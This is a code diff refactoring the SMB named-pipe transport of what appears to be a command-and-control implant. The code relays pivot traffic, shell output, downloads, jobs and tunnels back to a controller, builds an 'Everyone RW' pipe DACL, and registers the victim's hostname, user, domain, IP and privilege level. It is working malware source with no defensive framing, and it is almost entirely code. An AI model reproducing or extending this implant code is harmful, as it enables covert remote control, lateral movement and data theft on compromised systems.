@@ -10,6 +10,8 @@
 #include "Transport.h"
 #include "Pipe.h"
 
+#if NAX_TRANSPORT_PROFILE == NAX_TRANSPORT_SMB
+
 /* ========= [ permissive DACL - Everyone RW ] ========= */
 
 FUNC static BOOL SmbBuildPermissiveDacl( PNAX_INSTANCE Nax, PSECURITY_DESCRIPTOR pSD, PACL* ppAcl ) {
@@ -45,76 +47,6 @@ FUNC static BOOL SmbBuildPermissiveDacl( PNAX_INSTANCE Nax, PSECURITY_DESCRIPTOR
 
 /* ========= [ SMB transport helpers ] ========= */
 
-FUNC static BOOL SmbSendResult( PNAX_INSTANCE Nax, UINT32 tid, BYTE status, const PBYTE data, UINT32 data_len, PBYTE frame, UINT32 frame_cap, PBYTE env, UINT32 env_cap, HANDLE hPipe, HANDLE hWriteEvent ) {
-    UINT32 frame_len = frame_cap;
-    if ( NaxBuildResult( tid, status, data, data_len, frame, &frame_len ) != NAX_OK ) return TRUE;
-    UINT32 env_len = env_cap;
-    if ( NaxEncrypt( Nax, frame, frame_len, env, &env_len ) != NAX_OK ) return TRUE;
-    return NaxPipeWrite( Nax, hPipe, hWriteEvent, env, env_len );
-}
-
-FUNC static BOOL SmbRelayPivots( PNAX_INSTANCE Nax, PBYTE result, UINT32 result_cap, PBYTE frame, UINT32 frame_cap, PBYTE env, UINT32 env_cap, HANDLE hPipe, HANDLE hWriteEvent, BOOL* pDataRelayed ) {
-    UINT32 piv_len = NaxProcessPivots( Nax, result, result_cap );
-    *pDataRelayed = ( piv_len > 0 );
-    PBYTE  piv_cur = result;
-    UINT32 piv_rem = piv_len;
-    while ( piv_rem >= 4 ) {
-        UINT32 entryLen = *(UINT32*)piv_cur;
-        if ( entryLen == 0 || 4 + entryLen > piv_rem ) break;
-        if ( ! SmbSendResult( Nax, 0, NAX_STATUS_OK, piv_cur + 4, entryLen, frame, frame_cap, env, env_cap, hPipe, hWriteEvent ) )
-            return FALSE;
-        piv_cur += 4 + entryLen;
-        piv_rem -= 4 + entryLen;
-    }
-    if ( piv_len > 0 )
-        NaxDbg( Nax, "[pivot] relayed %u bytes of grandchild data", piv_len );
-    return TRUE;
-}
-
-FUNC static BOOL SmbRelayJobs( PNAX_INSTANCE Nax, PBYTE result, UINT32 result_cap, PBYTE frame, UINT32 frame_cap, PBYTE env, UINT32 env_cap, HANDLE hPipe, HANDLE hWriteEvent ) {
-    UINT32 job_len = NaxProcessJobs( Nax, result, result_cap );
-    UINT32 joff = 0;
-    while ( joff + 9 <= job_len ) {
-        BYTE   jtype = result[ joff ];
-        UINT32 jtid  = NaxR32( result + joff + 1 );
-        UINT32 jdata = NaxR32( result + joff + 5 );
-        if ( joff + 9 + jdata > job_len ) break;
-        if ( ! SmbSendResult( Nax, jtid, jtype, result + joff + 9, jdata, frame, frame_cap, env, env_cap, hPipe, hWriteEvent ) )
-            return FALSE;
-        joff += 9 + jdata;
-    }
-    return TRUE;
-}
-
-FUNC static BOOL SmbRelayShells( PNAX_INSTANCE Nax, PBYTE result, UINT32 result_cap, PBYTE frame, UINT32 frame_cap, PBYTE env, UINT32 env_cap, HANDLE hPipe, HANDLE hWriteEvent ) {
-    UINT32 sh_len = NaxProcessShells( Nax, result, result_cap );
-    UINT32 soff = 0;
-    while ( soff + 9 <= sh_len ) {
-        BYTE   stype = result[ soff ];
-        UINT32 stid  = NaxR32( result + soff + 1 );
-        UINT32 sdata = NaxR32( result + soff + 5 );
-        if ( soff + 9 + sdata > sh_len ) break;
-        if ( ! SmbSendResult( Nax, stid, stype, result + soff + 9, sdata, frame, frame_cap, env, env_cap, hPipe, hWriteEvent ) )
-            return FALSE;
-        soff += 9 + sdata;
-    }
-    return TRUE;
-}
-
-FUNC static BOOL SmbRelayDownloads( PNAX_INSTANCE Nax, PBYTE result, UINT32 result_cap, PBYTE frame, UINT32 frame_cap, PBYTE env, UINT32 env_cap, HANDLE hPipe, HANDLE hWriteEvent ) {
-    UINT32 dl_len = NaxProcessDownloads( Nax, result, result_cap );
-    UINT32 doff = 0;
-    while ( doff + 8 <= dl_len ) {
-        UINT32 tid  = NaxR32( result + doff );
-        UINT32 dlen = NaxR32( result + doff + 4 );
-        if ( doff + 8 + dlen > dl_len ) break;
-        if ( ! SmbSendResult( Nax, tid, NAX_STATUS_OK, result + doff + 8, dlen, frame, frame_cap, env, env_cap, hPipe, hWriteEvent ) )
-            return FALSE;
-        doff += 8 + dlen;
-    }
-    return TRUE;
-}
-
 FUNC static BOOL SmbTunnelActive( PNAX_INSTANCE Nax ) {
     NAX_TUNNEL* t = Nax->TunnelHead;
     while ( t ) {
@@ -125,16 +57,9 @@ FUNC static BOOL SmbTunnelActive( PNAX_INSTANCE Nax ) {
     return FALSE;
 }
 
-FUNC static BOOL SmbRelayTunnels( PNAX_INSTANCE Nax, PBYTE result, UINT32 result_cap, PBYTE frame, UINT32 frame_cap, PBYTE env, UINT32 env_cap, HANDLE hPipe, HANDLE hWriteEvent, BOOL* pDataRelayed ) {
-    UINT32 tun_len = NaxProcessTunnels( Nax, result, result_cap );
-    *pDataRelayed = ( tun_len > 0 );
-    if ( tun_len == 0 ) return TRUE;
-    return SmbSendResult( Nax, 0, NAX_STATUS_TUNNEL, result, tun_len, frame, frame_cap, env, env_cap, hPipe, hWriteEvent );
-}
-
 FUNC static BOOL SmbDoRegister( PNAX_INSTANCE Nax, PNAX_SYSINFO info, PBYTE frame_buf, UINT32 frame_cap, PBYTE env_buf, UINT32 env_cap, HANDLE hPipe, HANDLE hWriteEvent ) {
     BYTE   reg_body[NAX_REG_BODY_BUF]; UINT32 reg_body_len = NAX_REG_BODY_BUF;
-    if ( NaxBuildRegBody( info->Hostname, info->HnLen, info->Username, info->UnLen, NAX_ARCH_X64, info->Pid, Nax->Config.SleepMs, info->Tid, info->IpStr, info->IpLen, info->Domain, info->DmLen, info->Procname, info->PnLen, Nax->Elevated, Nax->OsMajor, Nax->OsMinor, Nax->OsBuild, Nax->ParentPid, Nax->Acp, Nax->OemCp, Nax->ImgPath, info->ImLen, reg_body, &reg_body_len ) != NAX_OK ) {
+    if ( NaxBuildRegBody( Nax, info, reg_body, &reg_body_len ) != NAX_OK ) {
         NaxDbg( Nax, "NaxBuildRegBody failed" );
         return FALSE;
     }
@@ -220,7 +145,7 @@ FUNC static BOOL SmbDispatchTasks( PNAX_INSTANCE Nax, PBYTE plain_buf, UINT32 pl
 
         NaxDbg( Nax, "[task] cmd=0x%02x done: stat=0x%02x r_len=%u", task.CmdId, r_stat, r_len );
 
-        if ( ! SmbSendResult( Nax, r_tid, r_stat, result_buf, r_len, frame_buf, frame_cap, env_buf, env_cap, hPipe, hWriteEvent ) ) {
+        if ( ! NaxSendResult( Nax, r_tid, r_stat, result_buf, r_len, frame_buf, frame_cap, env_buf, env_cap, hPipe, hWriteEvent ) ) {
             NaxDbg( Nax, "[task] result write failed" );
             return FALSE;
         }
@@ -462,7 +387,7 @@ FUNC VOID NaxSmbMain( PNAX_INSTANCE Nax ) {
 
             if ( ! pipe_ok ) break;
 
-            /* Snapshot DataSent BEFORE SmbRelayPivots → NaxProcessPivots
+            /* Snapshot DataSent BEFORE NaxRelayAll → NaxProcessPivots
              * clears it.  Without this, CmdPivotExec's flag is consumed
              * inside NaxProcessPivots and the fast-poll path never fires,
              * causing a full sleepMs delay before child results are read. */
@@ -474,30 +399,20 @@ FUNC VOID NaxSmbMain( PNAX_INSTANCE Nax ) {
                 _pv = _pv->Next;
             }
 
-            BOOL dataRelayed = FALSE;
-            if ( Nax->PivotHead )
-                pipe_ok = SmbRelayPivots( Nax, result_buf, RESULT_CAP, frame_buf, FRAME_CAP, env_buf, FRAME_CAP, hPipe, hWriteEvent, &dataRelayed );
-
-            if ( pipe_ok && Nax->DownloadHead )
-                pipe_ok = SmbRelayDownloads( Nax, result_buf, RESULT_CAP, frame_buf, FRAME_CAP, env_buf, FRAME_CAP, hPipe, hWriteEvent );
-
-            if ( pipe_ok && Nax->JobHead )
-                pipe_ok = SmbRelayJobs( Nax, result_buf, RESULT_CAP, frame_buf, FRAME_CAP, env_buf, FRAME_CAP, hPipe, hWriteEvent );
-
-            if ( pipe_ok && Nax->ShellHead )
-                pipe_ok = SmbRelayShells( Nax, result_buf, RESULT_CAP, frame_buf, FRAME_CAP, env_buf, FRAME_CAP, hPipe, hWriteEvent );
+            NAX_RELAY_CTX rctx;
+            rctx.hPipe        = hPipe;
+            rctx.hWriteEvent  = hWriteEvent;
+            rctx.DataRelayed  = FALSE;
+            rctx.TunnelRelayed = FALSE;
+            pipe_ok = NaxRelayAll( Nax, result_buf, RESULT_CAP, frame_buf, FRAME_CAP, env_buf, FRAME_CAP, &rctx );
 
             if ( Nax->JobWakeEvent )
                 Nax->Kernel32.ResetEvent( Nax->JobWakeEvent );
 
-            BOOL tunnelRelayed = FALSE;
-            if ( pipe_ok && Nax->TunnelHead ) {
-                pipe_ok = SmbRelayTunnels( Nax, result_buf, RESULT_CAP, frame_buf, FRAME_CAP, env_buf, FRAME_CAP, hPipe, hWriteEvent, &tunnelRelayed );
-                if ( Nax->TunnelEvent && Nax->Ws2.WSAResetEvent )
-                    Nax->Ws2.WSAResetEvent( Nax->TunnelEvent );
-            }
+            if ( Nax->TunnelEvent && Nax->Ws2.WSAResetEvent )
+                Nax->Ws2.WSAResetEvent( Nax->TunnelEvent );
 
-            if ( anyPivotDataSent || dataRelayed || tunnelRelayed )
+            if ( anyPivotDataSent || rctx.DataRelayed || rctx.TunnelRelayed )
                 justSentOutput = TRUE;
             if ( justSentOutput ) {
                 pivotPollCount   = 5;
@@ -510,6 +425,12 @@ FUNC VOID NaxSmbMain( PNAX_INSTANCE Nax ) {
         NaxDbg( Nax, "parent disconnected, re-entering accept loop" );
     }
 }
+
+#else /* HTTP build - NaxSmbMain is dead code but declared in Transport.h */
+
+FUNC VOID NaxSmbMain( PNAX_INSTANCE Nax ) { (void)Nax; }
+
+#endif /* NAX_TRANSPORT_SMB */
 
 /* ========= [ NaxSmbPost stub - satisfies linker for HTTP builds ] ========= */
 
